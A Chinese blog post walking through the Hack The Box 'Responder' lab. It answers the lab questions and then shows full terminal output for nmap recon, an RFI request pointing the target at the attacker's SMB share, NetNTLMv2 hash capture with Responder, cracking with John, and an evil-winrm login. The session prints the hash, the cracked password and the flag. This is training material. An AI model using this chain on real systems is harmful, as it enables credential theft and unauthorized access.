<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>HTB之Responder | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",favicon:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",avatar:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">HTB之Responder</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv4</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-08-17 23:25:58</span> <span class="mobile">2023-08-17 23:25</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-10-08 22:46:07</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/hackthebox/">HTB</a>&nbsp;</li><li>| <a href="/tags/success/">通关</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><blockquote><p>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></blockquote><h1 id="TASK-1"><a href="#TASK-1" class="headerlink" title="TASK 1"></a>TASK 1</h1><ul><li>问：当使用IP地址访问web服务时，我们被重定向到的域是什么?</li><li>答：unika.htb</li><li>P.S.可修改 hosts 文件禁止重定向，即在本地为域名 unika.htb 绑定靶机 IP，即便重定向也是重新只想靶机 IP。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/5f22bf809ff9a6b3e675732b7b81988e-173243.png" alt="image-20230228163213140"></p><h1 id="TASK-2"><a href="#TASK-2" class="headerlink" title="TASK 2"></a>TASK 2</h1><ul><li>问：服务器上使用哪种脚本语言生成网页?</li><li>答：php</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/0c57affd8048977278fcc0ce6120901f-173243.png" alt="image-20230228163526079"></p><h1 id="TASK-3"><a href="#TASK-3" class="headerlink" title="TASK 3"></a>TASK 3</h1><ul><li>问：用于加载网页的不同语言版本的URL参数的名称是什么？</li><li>答：page</li><li>译文：<strong>文件包含漏洞：</strong>动态网站包括动态的 HTML 页面，使用来自 HTTP 请求的信息包括 GET 和 POST 参数、cookie和其他变量。一个页面通常会根据其中一些参数“include”另一个页面。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/38d2a816eb963629a60148f90ec37474-173243.png" alt="image-20230228164357893"></p><h1 id="TASK-4"><a href="#TASK-4" class="headerlink" title="TASK 4"></a>TASK 4</h1><ul><li>问：“page”参数的以下值中的哪一个是利用本地文件包含（LFI）漏洞的示例：“fresh.html”、“&#x2F;&#x2F;10.10.14.6&#x2F;somefile”、“..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”、“minikatz.exe”。</li><li>答：<code>../../../.././../../windows/system32/drivers/etc/hosts</code></li><li>P.S.译文：当攻击者能够使网站包含一个不打算作为此应用程序选项的文件时，就会发生 LFI 或本地文件包含。一个常见的例子是应用程序使用文件路径作为输入。如果应用程序将此输入视为可信输入，并且未对此输入执行所需的安全检查，则攻击者可以使用 <code>../</code> 字符串，并最终查看本地文件系统中的敏感文件。在某些有限的情况下，LFI 也可以导致代码执行。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/58fe927faad5b6abfe15fc12b156c7c2-173243.png" alt="image-20230228172545400"></p><h1 id="TASK-5"><a href="#TASK-5" class="headerlink" title="TASK 5"></a>TASK 5</h1><ul><li>问：以下哪个<code>page</code>参数值是利用远程文件包含漏洞的示例：“french.html”，“&#x2F;&#x2F;10.10.14.6&#x2F;Somefile”，“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”，“mini katz.exe”</li><li>答：<code>//10.10.14.6/Somefile</code></li><li>P.S.译文：RFI 或远程文件包含类似于 LFI，但在这种情况下，攻击者可能会使用 HTTP、FTP 等协议在主机上加载远程文件。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/071f1050f6778a50c4c53bc1ba6238b5-173243.png" alt="image-20230301091952346"></p><h1 id="TASK-6"><a href="#TASK-6" class="headerlink" title="TASK 6"></a>TASK 6</h1><ul><li>问：NTLM代表什么?</li><li>答：New Technology LAN Manager</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/f20aed134b1ffa5935ae5ed86ed6b644-173243.png" alt="image-20230301092515314"></p><h1 id="TASK-7"><a href="#TASK-7" class="headerlink" title="TASK 7"></a>TASK 7</h1><ul><li>问：我们在Responder实用程序中使用哪个标志来指定网络接口（网卡）？</li><li>答：-I</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/7f01776bf9595d462fd72a5418047d10-173243.png" alt="image-20230301095939050"></p><h1 id="TASK-8"><a href="#TASK-8" class="headerlink" title="TASK 8"></a>TASK 8</h1><ul><li>问：有几种工具可以接受NetNTLMv2挑战&#x2F;响应，并尝试数百万个密码，以查看其中是否有任何一个生成相同的响应。一个这样的工具通常被称为“john”，但全名是什么？</li><li>答：John the Ripper</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/6e692b088389a42721adce98bb1ba5b5-173243.png" alt="image-20230301100716239"></p><h1 id="TASK-9"><a href="#TASK-9" class="headerlink" title="TASK 9"></a>TASK 9</h1><ul><li>问：administrator 用户的密码是什么？</li><li>答：badminton</li><li>P.S.Responder 可以执行许多不同类型的攻击，但在这种情况下，它将设置恶意 SMB 服务器。当目标计算机尝试对该服务器执行 NTLM 身份验证时，Responder 会向服务器发送一个质询，要求服务器使用用户的密码进行加密。当服务器响应时，Responder 将使用质询和加密响应生成 NetNTLMv2。虽然我们无法逆转 NetNTLMv2，但我们可以尝试许多不同的常用密码，看看是否有任何密码生成相同的挑战响应，如果找到一个，我们知道这就是密码。这通常被称为哈希破解，我们将使用一个名为 John The Ripper 的程序进行破解。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/37916d3685d71f014a6492eb5f530eb3-173243.png" alt="image-20230301104914172"></p><h1 id="TASK-10"><a href="#TASK-10" class="headerlink" title="TASK 10"></a>TASK 10</h1><ul><li>问：我们将使用Windows服务(即在机器上运行)，使用我们恢复的密码远程访问Responder机器。<br>它监听哪个端口的tcp？</li><li>答：5985</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/caaebd8b170400bc41a1422bce480e6a-173243.png" alt="image-20230301105618485"></p><h1 id="SUBMIT-FLAG"><a href="#SUBMIT-FLAG" class="headerlink" title="SUBMIT FLAG"></a>SUBMIT FLAG</h1><ul><li>问：Submit root flag</li><li>答：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># P.S.whatweb 网站指纹识别的工具</span></span><br><span class="line">kali@kali:~/Test$ whatweb 10.129.102.159</span><br><span class="line">http://10.129.102.159 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.102.159], Meta-Refresh-Redirect[http://unika.htb/], OpenSSL[1.1.1m], PHP[8.1.1], X-Powered-By[PHP/8.1.1]</span><br><span class="line">ERROR Opening: http://unika.htb/ - no address <span class="keyword">for</span> unika.htb</span><br><span class="line"><span class="comment"># P.S.nmap 起手式</span></span><br><span class="line">kali@kali:~/Test$ nmap -p- --min-rate 5000 -sV 10.129.102.159</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 16:48 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.102.159</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span>)</span><br><span class="line"><span class="number">5985</span>/tcp open  http       Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">7680</span>/tcp open  tcpwrapped</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">127.47</span> seconds</span><br><span class="line"># P.S.先配 hosts 文件</span><br><span class="line"># P.S.Windows</span><br><span class="line"><span class="number">10.129</span>.<span class="number">102.159</span> unika.htb</span><br><span class="line"># P.S.Linux</span><br><span class="line">kali@kali:~$ echo &quot;<span class="number">10.129</span>.<span class="number">102.159</span> unika.htb&quot; | sudo tee -a /etc/hosts</span><br><span class="line"><span class="number">10.129</span>.<span class="number">102.159</span> unika.htb</span><br><span class="line"># P.S.responder 一种利用身份认证协议，监听获取口令哈希的工具，可污染 LLMNR 和 NBT-NS 请求。</span><br><span class="line"># P.S.responder 能回答发出的 LLMNR 和 NBT-NS 查询，诱使受害者主机提供 Net-NTLM 哈希。</span><br><span class="line"># P.S.该工具一般只针对 SMB 的文件服务器服务请求</span><br><span class="line">kali@kali:~/Test$ responder --help</span><br><span class="line">……</span><br><span class="line">  -I eth0, --interface=eth0</span><br><span class="line">                        Network interface to use, you can use &#x27;ALL&#x27; as a</span><br><span class="line">                        wildcard for all interfaces</span><br><span class="line">  -i <span class="number">10.0</span>.<span class="number">0.21</span>, --ip=<span class="number">10.0</span>.<span class="number">0.21</span></span><br><span class="line">                        Local IP to use (only for OSX)</span><br><span class="line">……</span><br><span class="line"># P.S.john 一款用于查找用户的弱密码的工具</span><br><span class="line">kali@kali:~/Test$ john</span><br><span class="line">John the Ripper <span class="number">1.9</span>.<span class="number">0</span>-jumbo-<span class="number">1</span>+bleeding-aec1328d6c <span class="number">2021</span>-<span class="number">11</span>-<span class="number">02</span> <span class="number">10</span>:<span class="number">45</span>:<span class="number">52</span> +<span class="number">0100</span> OMP [linux-gnu <span class="number">64</span>-bit x86_64 AVX2 AC]</span><br><span class="line">Copyright (c) <span class="number">1996</span>-<span class="number">2021</span> by Solar Designer and others</span><br><span class="line">Homepage: https://www.openwall.com/john/</span><br><span class="line"></span><br><span class="line">Usage: john [OPTIONS] [PASSWORD-FILES]</span><br><span class="line"></span><br><span class="line">Use --help to list all available options.</span><br><span class="line"># P.S.使用 responder 监听本地 tun0 网卡（加载 htb 提供的 openvpn 配置文件后出现的网卡）。</span><br><span class="line"># P.S.responder -I 指定监听的网络接口tun0。</span><br><span class="line"># P.S.当⽹络浏览器发送有效负载并收到有关⽆法加载请求⽂件的错误时，此处获取 NTLMv2 哈希。</span><br><span class="line"># P.S.windows 基于 NTLM 认证的有 SMB、HTTP、LDAP、MSSQL等，</span><br><span class="line"># P.S.responder 可以通过模拟正常的 SMB 协议从而获得受害机器的 NTLMV2 hash 值，NTLM v2不能直接应用于 Pass The Hash攻击，只能通过暴力破解来获取明文密码。</span><br><span class="line">kali@kali:~/Test$ sudo responder -I tun0</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">……</span><br><span class="line">[+] Listening for events...</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : <span class="number">10.129</span>.<span class="number">95.234</span></span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<span class="number">69</span>d3a977a2c3b479:<span class="number">4</span>C5DC3C77EF39DB2A8B8A994B74CCAD3:<span class="number">0101000000000000003</span>C8919274CD90132179484033D35510000000002000800430036005500510001001E00570049004E002D005500560030003800390041005700580047005800360004003400570049004E002D00550056003000380039004100570058004700580036002E0043003600550051002E004C004F00430041004C000300140043003600550051002E004C004F00430041004C000500140043003600550051002E004C004F00430041004C0007000800003C8919274CD901060004000200000008003000300000000000000001000000002000005E347BFEE5F968BC81C1DB9B5FEC5A6766AFA12787563F35589B20B9C52729FC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330033000000000000000000</span><br><span class="line"># P.S.curl 一种用来请求 Web 服务器的工具</span><br><span class="line"># P.S.利用远程文件包含，请求如下 url 以获取靶机的 administrator 用户的哈希密码。</span><br><span class="line"># P.S.<span class="number">10.10</span>.<span class="number">16.33</span> 为使用 htb 提供 openvpn 配置文件获得的与靶机同属同一局域网的本地 ip。</span><br><span class="line"># P.S.//<span class="number">10.10</span>.<span class="number">16.33</span>/admin.txt SMB 共享的地址。</span><br><span class="line"># P.S.当靶机服务器尝试从我们的 SMB 服务器加载资源，Responder 捕获⾜够的资源以获取 NetNTLMv2。</span><br><span class="line">kali@kali:~/Test$ curl http://unika.htb?page=//<span class="number">10.10</span>.<span class="number">16.33</span>/admin.txt</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  include(\\<span class="number">10.10</span>.<span class="number">16.33</span>\ADMIN.TXT): Failed to open stream: Permission denied in &lt;b&gt;C:\xampp\htdocs\index.php&lt;/b&gt; on line &lt;b&gt;<span class="number">11</span>&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  include(): Failed opening &#x27;//<span class="number">10.10</span>.<span class="number">16.33</span>/admin.txt&#x27; for inclusion (include_path=&#x27;\xampp\php\PEAR&#x27;) in &lt;b&gt;C:\xampp\htdocs\index.php&lt;/b&gt; on line &lt;b&gt;<span class="number">11</span>&lt;/b&gt;&lt;br /&gt;</span><br><span class="line"># P.S.将 hash 密码重定向到 key.txt 文件中</span><br><span class="line">kali@kali:~/Test$ echo &#x27;Administrator::RESPONDER:<span class="number">69</span>d3a977a2c3b479:<span class="number">4</span>C5DC3C77EF39DB2A8B8A994B74CCAD3:<span class="number">0101000000000000003</span>C8919274CD90132179484033D35510000000002000800430036005500510001001E00570049004E002D005500560030003800390041005700580047005800360004003400570049004E002D00550056003000380039004100570058004700580036002E0043003600550051002E004C004F00430041004C000300140043003600550051002E004C004F00430041004C000500140043003600550051002E004C004F00430041004C0007000800003C8919274CD901060004000200000008003000300000000000000001000000002000005E347BFEE5F968BC81C1DB9B5FEC5A6766AFA12787563F35589B20B9C52729FC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330033000000000000000000&#x27; &gt;key.txt</span><br><span class="line"># P.S.查看密码字典目录</span><br><span class="line">kali@kali:~/Test$ ls /usr/share/wordlists</span><br><span class="line">amass  dirb  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt.gz  sqlmap.txt  wfuzz  wifite.txt</span><br><span class="line"># P.S.解压官方手册提示的字典压缩包</span><br><span class="line">kali@kali:~/Test$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">……</span><br><span class="line"># P.S.查看 /usr/share/wordlists 目录文件</span><br><span class="line">kali@kali:~/Test$ ls /usr/share/wordlists</span><br><span class="line">amass  dirb  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt  sqlmap.txt  wfuzz  wifite.txt</span><br><span class="line"># P.S.john 爆破 hash</span><br><span class="line"># P.S.-w 指定字典</span><br><span class="line">kali@kali:~/Test$ john key.txt -w=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">badminton        (Administrator)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> DONE (<span class="number">2023</span>-<span class="number">03</span>-<span class="number">01</span> <span class="number">10</span>:<span class="number">36</span>) <span class="number">100.0</span>g/s <span class="number">409600</span>p/s <span class="number">409600</span>c/s <span class="number">409600</span>C/s adriano..oooooo</span><br><span class="line">Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"># P.S.evil-winrm 一个可用于黑客攻击/渗透测试的Windows远程管理(WinRM) Shell</span><br><span class="line">kali@kali:~/Test$ sudo apt install evil-winrm</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">……</span><br><span class="line"># P.S.连接 WinRM shell</span><br><span class="line">kali@kali:~/Test$ evil-winrm -i <span class="number">10.129</span>.<span class="number">95.234</span> -u administrator -p badminton</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.<span class="number">4</span> </span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine </span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion </span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint </span><br><span class="line">……</span><br><span class="line"># P.S.列文件</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; dir</span><br><span class="line">……</span><br><span class="line"># P.S.dir /S flag.txt 报错，一个个找喽</span><br><span class="line">*Evil-WinRM* PS C:\Users\mike&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\mike\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\mike\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         <span class="number">3</span>/<span class="number">10</span>/<span class="number">2022</span>   <span class="number">4</span>:<span class="number">50</span> AM             <span class="number">32</span> flag.txt</span><br><span class="line"></span><br><span class="line"># P.S.找到位于 mike 账户 desktop 下的 flag.txt</span><br><span class="line">ca*Evil-WinRM* PS C:\Users\mike\Desktop&gt; cat flag.txt</span><br><span class="line">ea81b7afddd03efaa0945333ed147fac</span><br></pre></td></tr></table></figure><h1 id="P-S-配置-hosts-文件以解析网址"><a href="#P-S-配置-hosts-文件以解析网址" class="headerlink" title="P.S.配置 hosts 文件以解析网址"></a>P.S.配置 hosts 文件以解析网址</h1><ul><li>基于名称的虚拟主机是一种在单个服务器上托管多个域名（对每个域名进行单独处理）的方法。</li><li>这允许一台服务器共享其资源，如内存和处理器周期，而不需要同一主机名使用所有服务。</li><li>web 服务器检查HTTP请求的主机头字段中提供的域名，并根据该域名发送响应。</li><li><code>/etc/hosts</code> 文件用于将主机名解析为 IP 地址，因此我们需要在 <code>/etc/hosts</code> 中为此域添加一个条目，以使浏览器能够解析 <code>unika.htb</code> 的地址。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># P.S.配 hosts 文件</span></span><br><span class="line"><span class="comment"># P.S.Windows</span></span><br><span class="line">10.129.102.159 unika.htb</span><br><span class="line"><span class="comment"># P.S.Linux</span></span><br><span class="line">kali@kali:~$ <span class="built_in">echo</span> <span class="string">&quot;10.129.102.159 unika.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.129.102.159 unika.htb</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/05/25/b1cdea3b171a3c4eacc6b5601c7f36cf-173243.png" alt="image-20230228170755188"></p><ul><li>P.S.1.靶机重定向，修改 hosts 文件将重定向到的域名绑定靶机 ip 以实现正常访问靶机站点。</li><li>P.S.2.nmap 扫描出 5985 端口，查找出 <code>Winrm</code> 服务，搜索到 <code>evil-winrm</code> 工具使用；需要账号密码，多关键字查找得到“通过 NTLM 捕获进行 SMB 攻击”，看到 <code>Responder</code> 捕获用户的哈希值；继续搜索 <code>hashcat</code> 爆破 <code>ntlmv2 hash</code> 。</li><li>P.S.3.5985 端口关联 winrm 服务–&gt; 利用 responder 捕获用户 hash –&gt; 利用 hashcat 或 john 爆破 ntlmv2 hash 得到密码 –&gt; 利用 evil-winrm 连接 winrm 服务控制靶机服务器。</li></ul></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">HTB之Responder</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2023-08-17 23:25:58</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/7baed2e6.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/hackthebox/">#HTB</a>&nbsp;</li><li class="tag-item"><a href="/tags/success/">#通关</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/article/3d1f808e.html"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">HTB之Sequel</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/article/a62377d0.html"><span class="title flex-center"><span class="post-nav-title-item">HTB之Crocodile</span> <span class="post-nav-item">下一篇</span> 